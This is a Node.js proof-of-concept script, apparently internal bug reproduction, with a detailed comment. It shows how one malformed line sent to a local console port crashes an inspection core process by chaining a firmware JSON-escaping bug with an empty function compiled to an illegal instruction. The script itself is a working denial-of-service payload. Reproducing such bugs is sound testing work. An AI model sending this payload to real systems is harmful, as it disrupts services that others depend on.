// Deterministic reproduction of F1: one line kills the core process.
//
//   node quote_crash.mjs [--tries 3] [--port 4099]
//
// TWO BUGS IN SERIES. Either one alone is survivable; together they are a
// remote core kill from one malformed line.
//
// 1. THE DEVICE quotes attacker bytes into a JSON debug message without
//    escaping them (`LegacyFirmware.cpp:4285`, MData_JR::recv_ERROR):
//
//      for(int i=0;i<buffIdx;i++)
//        if(dataBuff[i]=='"') dataBuff[i]='\'';        // dataBuff IS escaped
//      ...
//      dbg_printf("recv_ERROR:%d %s dat:%s", errorcode, dataBuff,
//                 string((char*)recv_data,0,9).c_str());   // recv_data is NOT
//
//    dbg_printf wraps its output in {"dbg":"..."}. So any `"` among the first
//    nine bytes of recv_data closes that string early and the device emits a
//    MALFORMED frame. recv_data is non-NULL for exactly one error type,
//    INIT_CHAR_ERROR (`Data_Layer_Protocol.cpp:355`) -- a byte outside a frame.
//
// 2. THE CORE executes an illegal instruction on any malformed frame:
//    PerifChannel::recv_ERROR (`wiringPanel.cpp:1500`) is an `int` function
//    with an empty body, which gcc -O2 emits as a bare `ud2`.
//
//      0000000140151ff0 <PerifChannel::recv_ERROR>:  0f 0b  ud2
//
// So: get one quote character in front of the device's parser while it is
// between frames, and the core dies.
//
// WHY THE OBVIOUS TRIGGER DOES NOT WORK. An empty container
// (`{"type":"ping","x":[]}`) latches the device too, but as JSON_FORMAT_ERROR,
// which calls recv_ERROR with recv_data == NULL -- no `dat:` field, no
// unescaped bytes, valid JSON out. The core survives it: measured 40/40 latch
// and recover cycles with `latch_loop.mjs`. The quote is the whole difference.
//
// The line below is accepted by the console's JSON guard (it starts with `{`),
// frames cleanly as a ping, and then leaves a quote on the wire between frames.
import net from 'node:net';
import { execSync } from 'node:child_process';

const argv = process.argv.slice(2);
const num = (n, d) => { const i = argv.indexOf(`--${n}`); return i >= 0 ? Number(argv[i + 1]) : d; };
const TRIES = num('tries', 3);
const PORT = num('port', 4099);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const coreAlive = () => { try { return /visSele\.exe/.test(execSync('tasklist', { encoding: 'utf8' })); } catch { return null; } };

const PAYLOAD = '{"type":"ping"} "AAAA"';

for (let t = 1; t <= TRIES; t++) {
  if (!coreAlive()) { console.log(`try ${t}: core already gone`); break; }
  const s = net.connect(PORT, '127.0.0.1');
  s.on('error', () => {});
  await new Promise((r) => { s.once('connect', r); s.once('error', r); });
  console.log(`try ${t}: sending  ${PAYLOAD}`);
  try { s.write(PAYLOAD + '\n'); } catch {}
  let died = 0;
  for (let i = 1; i <= 12; i++) {
    await sleep(1000);
    if (!coreAlive()) { died = i; break; }
  }
  try { s.destroy(); } catch {}
  if (died) {
    console.log(`  core died after ${died}s`);
    try {
      const dmp = execSync('ls -t InspectionCore/Core0_1/insp_crash_*.dmp | head -1',
        { encoding: 'utf8', shell: 'C:/msys64/usr/bin/bash.exe', cwd: 'C:/Users/w2110/Documents/workspace/visSele' }).trim();
      if (dmp) console.log(`  minidump: ${dmp}`);
    } catch {}
    process.exit(0);
  }
  console.log('  core survived 12s');
  await sleep(1500);
}
console.log('\nnot reproduced');
process.exit(1);
